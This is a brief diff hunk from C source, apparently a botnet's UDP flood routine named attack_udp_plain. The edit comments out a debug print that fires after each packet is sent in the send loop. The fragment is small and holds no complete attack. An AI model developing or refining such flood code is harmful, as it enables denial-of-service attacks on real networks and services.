@@ -462,7 +462,7 @@ void attack_udp_plain(uint8_t targs_len, struct attack_target *targs, uint8_t op
             {
                 printf("send failed: %d\n", errno);
             } else {
-                printf(".\n");
+                /*printf(".\n");*/
             }
 #else
             send(fds[i], data, data_len, MSG_NOSIGNAL);
